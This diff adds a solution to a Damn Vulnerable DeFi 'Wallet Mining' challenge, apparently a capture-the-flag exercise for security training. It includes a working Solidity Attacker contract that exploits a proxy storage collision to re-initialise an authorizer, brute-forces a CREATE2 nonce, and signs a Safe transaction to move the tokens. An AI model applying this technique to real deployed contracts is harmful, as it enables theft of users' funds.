@@ -12,6 +12,11 @@ import {
     AuthorizerFactory, AuthorizerUpgradeable, TransparentProxy
 } from "../../src/wallet-mining/AuthorizerFactory.sol";
 
+import {SafeProxy} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxy.sol";
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import "forge-std/Vm.sol";
+import "forge-std/StdCheats.sol";
+
 contract WalletMiningChallenge is Test {
     address deployer = makeAddr("deployer");
     address upgrader = makeAddr("upgrader");
@@ -123,7 +128,21 @@ contract WalletMiningChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_walletMining() public checkSolvedByPlayer {
-        
+        Attacker attacker = new Attacker(
+            vm,
+            token,
+            authorizer,
+            walletDeployer,
+            proxyFactory,
+            singletonCopy,
+            player,
+            ward,
+            user,
+            userPrivateKey,
+            USER_DEPOSIT_ADDRESS,
+            DEPOSIT_TOKEN_AMOUNT
+        );
+        attacker.attack();
     }
 
     /**
@@ -151,8 +170,155 @@ contract WalletMiningChallenge is Test {
 
         // Player recovered all tokens for the user
         assertEq(token.balanceOf(user), DEPOSIT_TOKEN_AMOUNT, "Not enough tokens in user's account");
-
         // Player sent payment to ward
         assertEq(token.balanceOf(ward), initialWalletDeployerTokenBalance, "Not enough tokens in ward's account");
+    }
+}
+
+contract Attacker {
+    Vm private vm;
+    DamnValuableToken private token;
+    AuthorizerUpgradeable private authorizer;
+    WalletDeployer private walletDeployer;
+    SafeProxyFactory private proxyFactory;
+    Safe private singletonCopy;
+    address private player;
+    address private ward;
+    address private user;
+    uint256 private userPrivateKey;
+    address private USER_DEPOSIT_ADDRESS;
+    uint256 private DEPOSIT_TOKEN_AMOUNT;
+
+    constructor(
+        Vm _vm,
+        DamnValuableToken _token,
+        AuthorizerUpgradeable _authorizer,
+        WalletDeployer _walletDeployer,
+        SafeProxyFactory _proxyFactory,
+        Safe _singletonCopy,
+        address _player,
+        address _ward,
+        address _user,
+        uint256 _userPrivateKey,
+        address _USER_DEPOSIT_ADDRESS,
+        uint256 _DEPOSIT_TOKEN_AMOUNT
+    ) {
+        vm = _vm;
+        token = _token;
+        authorizer = _authorizer;
+        walletDeployer = _walletDeployer;
+        proxyFactory = _proxyFactory;
+        singletonCopy = _singletonCopy;
+        player = _player;
+        ward = _ward;
+        user = _user;
+        userPrivateKey = _userPrivateKey;
+        USER_DEPOSIT_ADDRESS = _USER_DEPOSIT_ADDRESS;
+        DEPOSIT_TOKEN_AMOUNT = _DEPOSIT_TOKEN_AMOUNT;
+    }
+
+    function attack() external {
+        // STEP 1: Determine the nonce to deploy USER_DEPOSIT_ADDRESS
+        //
+        // - According to README.md:
+        //   "The team transferred 20 million DVT tokens to a user at `0x8be6a88D3871f793aD5D5e24eF39e1bf5be31d2b`,
+        //   where her plain 1-of-1 Safe was supposed to land. But they lost the nonce they should use for deployment."
+        //   "Nobody knows what to do, let alone the user. She granted you access to her private key.
+        //
+        // - We prepare the wallet initializer by setting `user` as the wallet owner and a threshold of 1,
+        //   leaving the remaining parameters blank. We then run a loop that uses `vm::computeCreate2Address()`
+        //   to determine the correct nonce. This nonce will be used later in the challenge (STEP 3).
+        bytes memory initializer;
+        {
+            address[] memory owners = new address[](1);
+            owners[0] = user;
+            initializer = abi.encodeWithSelector(
+                    Safe.setup.selector, owners, 1, address(0), "", address(0), address(0), 0, payable(0));
+        }
+
+        uint256 targetNonce = 0;
+        for (;;targetNonce++) {
+            address targetAddr = vm.computeCreate2Address(
+                keccak256(abi.encodePacked(keccak256(initializer), targetNonce)),
+                keccak256(abi.encodePacked(type(SafeProxy).creationCode, uint256(uint160(address(singletonCopy))))),
+                address(proxyFactory)
+            );
+
+            if (targetAddr == USER_DEPOSIT_ADDRESS) break;
+        }
+
+        // STEP 2: Exploit a Storage Collision
+        //
+        // - AuthorizerFactory::deployWithProxy() creates a TransparentProxy instance (an ERC1967Proxy)
+        //   using an AuthorizerUpgradeable instance and the AuthorizerFactory::init() function with
+        //   `wards` and `aims` as parameters. So far, so good.
+        //
+        // - Both AuthorizerUpgradeable and TransparentProxy access slot 0, creating a storage collision vulnerability.
+        //   AuthorizerUpgradeable defines the variable `needsInit`, while TransparentProxy defines `upgrader`.
+        //
+        // - During the execution of `deployWithProxy()`, slot 0 is accessed in the following order:
+        //   - `uint256 public needsInit = 1`: sets `needsInit` to 1
+        //   - Creation of AuthorizerUpgradeable instance: sets `needsInit` to 0
+        //   - `address public upgrader = msg.sender`: sets `upgrader` to the AuthorizerFactory instance's address
+        //   - AuthorizerFactory::init(): checks the `upgrader` value, then sets `needsInit` to 0
+        //   - `assert(AuthorizerUpgradeable(authorizer).needsInit() == 0)`: confirms `needsInit` is 0
+        //   - `TransparentProxy(payable(authorizer)).setUpgrader(upgrader)`: sets the upgrader address
+        //
+        // - Since the `upgrader` value is different from 0, we can invoke `authorizer.init()` with custom parameters.
+        {
+            address[] memory wards = new address[](1);
+            wards[0] = address(this);
+            address[] memory aims = new address[](1);
+            aims[0] = USER_DEPOSIT_ADDRESS;
+            authorizer.init(wards, aims);
+        }
+        // STEP 3: Recovering the funds
+        //
+        // Using WalletDeployer::drop() to invoke SafeProxyFactory::createProxyWithNonce().
+        //
+        // - After identifying the nonce in STEP 1 and modifying the deployment privileges in STEP 2,
+        //   we call WalletDeployer::drop() to deploy the wallet.
+        //
+        // - To transfer the funds from the newly created wallet back to the user, we utilize the cheat code
+        //   vm.sign with the user's private key to compute the transaction signature. Ensure that the nonce
+        //   (last parameter in getTransactionHash()) is set to 0, as the wallet address has not initiated any
+        //   prior transactions.
+        //
+        // - Once the token transfer transaction is executed successfully, the recovered funds are sent to the ward.
+        {
+            walletDeployer.drop(USER_DEPOSIT_ADDRESS, initializer, targetNonce);
+            bytes memory callData = abi.encodeWithSelector(IERC20.transfer.selector, user, DEPOSIT_TOKEN_AMOUNT);
+
+            bytes32 transactionHash = Safe(payable(USER_DEPOSIT_ADDRESS)).getTransactionHash(
+                address(token),
+                0,
+                callData,
+                Enum.Operation.Call,
+                0,
+                0,
+                0,
+                address(0),
+                payable(address(0)),
+                0
+            );
+
+            (uint8 v, bytes32 r, bytes32 s) = vm.sign(userPrivateKey, transactionHash);
+            bytes memory signature = abi.encodePacked(r, s, v);
+
+            Safe(payable(USER_DEPOSIT_ADDRESS)).execTransaction(
+                address(token),
+                0,
+                callData,
+                Enum.Operation.Call,
+                0,
+                0,
+                0,
+                address(0),
+                payable(address(0)),
+                signature
+            );
+
+            token.transfer(ward, token.balanceOf(address(this)));
+        }
     }
 }
